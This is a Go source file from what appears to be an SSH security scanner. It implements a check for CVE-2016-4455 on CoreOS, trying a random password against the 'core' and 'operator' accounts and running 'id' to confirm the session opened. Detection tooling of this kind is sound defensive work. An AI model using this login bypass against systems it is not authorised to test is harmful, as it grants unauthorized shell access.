package cmd

import (
	"errors"
	"fmt"
	"net"
	"regexp"
	"strconv"
	"time"

	"github.com/runZeroInc/excrypto/x/crypto/ssh"
	"github.com/runZeroInc/sshamble/auth"
)

const checkVulnCoreOSPamPermit = "vuln-coreos-pam-permit"

// coreosPamPermitRef is the CoreOS security brief for CVE-2016-4455.
const coreosPamPermitRef = "https://web.archive.org/web/20160602013344/https://coreos.com/blog/security-brief-coreos-linux-alpha-remote-ssh-issue.html"

// coreosPamPermitBanner matches the banner announced by the OpenSSH 7.2p2
// build shipped in CoreOS Linux Alpha 1045.0.0 and 1047.0.0. Upstream sshd
// omits the portable suffix, and CoreOS set no version addendum, so the
// banner is exactly this string.
var coreosPamPermitBanner = regexp.MustCompile(`^SSH-2\.0-OpenSSH_7\.2$`)

// coreosPamPermitUsers are the password-less accounts present on every
// CoreOS system; the brief names both as exploited in the wild.
var coreosPamPermitUsers = []string{"core", "operator"}

// coreosPamPermitAffectedVersion reports whether the banner matches the
// OpenSSH build shipped by the affected CoreOS releases.
func coreosPamPermitAffectedVersion(version string) bool {
	return coreosPamPermitBanner.MatchString(version)
}

// coreosPamPermitCandidateUsers returns the usernames to try: the configured
// user first, then the CoreOS accounts not already covered by it.
func coreosPamPermitCandidateUsers(configured string) []string {
	users := []string{}
	if configured != "" {
		users = append(users, configured)
	}
	for _, u := range coreosPamPermitUsers {
		if u != configured {
			users = append(users, u)
		}
	}
	return users
}

// coreosPamPermitExecRan reports whether an exec request completed on the
// session. A remote exit status (zero or not) and a channel that closed
// without sending one both mean the command was accepted and ran.
func coreosPamPermitExecRan(err error) (string, bool) {
	if err == nil {
		return "0", true
	}
	var exitErr *ssh.ExitError
	if errors.As(err, &exitErr) {
		return strconv.Itoa(exitErr.ExitStatus()), true
	}
	var missing *ssh.ExitMissingError
	if errors.As(err, &missing) {
		return "", true
	}
	return "", false
}

// coreosPamPermitConfirmed reports whether the random-password attempt opened
// a session that ran a command. Reaching the session stage alone is not
// enough: the channel can open and then fail before any command executes.
func coreosPamPermitConfirmed(stage string, sessionOpened bool) bool {
	return stage == "session" && sessionOpened
}

// coreosPamPermitSessionHandler runs a command on the opened session and
// records whether it ran.
func coreosPamPermitSessionHandler(sessionOpened *bool) auth.SessionHandler {
	return func(c net.Conn, sclient *ssh.Client, ses *ssh.Session, res *auth.AuthResult) error {
		_ = c.SetDeadline(time.Now().Add(15 * time.Second))
		out, err := ses.CombinedOutput("id")
		res.SessionOutput = auth.CleanSessionOutput(out)
		status, ran := coreosPamPermitExecRan(err)
		if !ran {
			return err
		}
		res.ExitStatus = status
		*sessionOpened = true
		return nil
	}
}

// coreosPamPermitAuth pairs an SSH auth method with its name for logging.
type coreosPamPermitAuth struct {
	name string
	am   ssh.AuthMethod
}

// coreosPamPermitAuthMethods returns the auth methods to try with the given
// password, in the order CoreOS exposed them: keyboard-interactive via PAM
// first, then password if the server offers it.
func coreosPamPermitAuthMethods(root *auth.AuthResult, password string) []coreosPamPermitAuth {
	methods := []coreosPamPermitAuth{}
	if root.SupportsAuth("keyboard-interactive") {
		am := ssh.KeyboardInteractive(func(name, instr string, questions []string, echos []bool) ([]string, error) {
			answers := make([]string, len(questions))
			for i := range questions {
				answers[i] = password
			}
			return answers, nil
		})
		methods = append(methods, coreosPamPermitAuth{name: "keyboard-interactive", am: am})
	}
	if root.SupportsAuth("password") {
		am := ssh.PasswordCallback(func() (string, error) {
			return password, nil
		})
		methods = append(methods, coreosPamPermitAuth{name: "password", am: am})
	}
	return methods
}

func sshCheckVulnCoreOSPamPermit(addr string, conf *ScanConfig, options *auth.Options, root *auth.AuthResult) *auth.AuthResult {
	tname := checkVulnCoreOSPamPermit
	if !conf.IsCheckEnabled(tname) {
		return nil
	}
	if !coreosPamPermitAffectedVersion(root.Version) {
		conf.Logger.Debugf("%s %s skipped: server version %q does not match the affected CoreOS OpenSSH build", addr, tname, root.Version)
		return nil
	}
	if !root.SupportsAuth("keyboard-interactive") && !root.SupportsAuth("password") {
		conf.Logger.Debugf("%s %s skipped: server offers neither keyboard-interactive nor password auth", addr, tname)
		return nil
	}

	conf.Logger.Debugf("%s %s is running for user %s", addr, tname, options.Username)

	testPass := genRandomPassword()
	for _, user := range coreosPamPermitCandidateUsers(options.Username) {
		uopts := options.WithUsername(user)
		for _, m := range coreosPamPermitAuthMethods(root, testPass) {
			sessionOpened := false
			o := uopts.WithSessionHandler(coreosPamPermitSessionHandler(&sessionOpened))
			res := auth.SSHAuth(addr, o, auth.SSHAuthHandlerSingle(m.am))
			if res.Unreachable {
				conf.Logger.Debugf("%s %s stopped: target unreachable: %v", addr, tname, res.Error)
				return res
			}
			if !coreosPamPermitConfirmed(res.Stage, sessionOpened) {
				conf.Logger.Debugf("%s %s did not open a session for user %s via %s (stage %s): %v", addr, tname, user, m.name, res.Stage, res.Error)
				continue
			}

			conf.Logger.Warnf("%s %s accepted a random password for user %s via %s", addr, tname, user, m.name)
			root.AddVuln(auth.VulnResult{
				ID:    tname,
				Ref:   coreosPamPermitRef,
				Proof: fmt.Sprintf("CVE-2016-4455: a random password opened a session for %s via %s. Session output: %s", user, m.name, res.SessionOutput),
			})
			res.SessionMethod = tname
			root.SessionMethod = tname
			root.SessionUser = user
			root.SessionOutput = res.SessionOutput
			root.SessionSecret = testPass
			root.ExitStatus = res.ExitStatus
			root.SessionAuth = m.am
			return res
		}
	}
	return nil
}
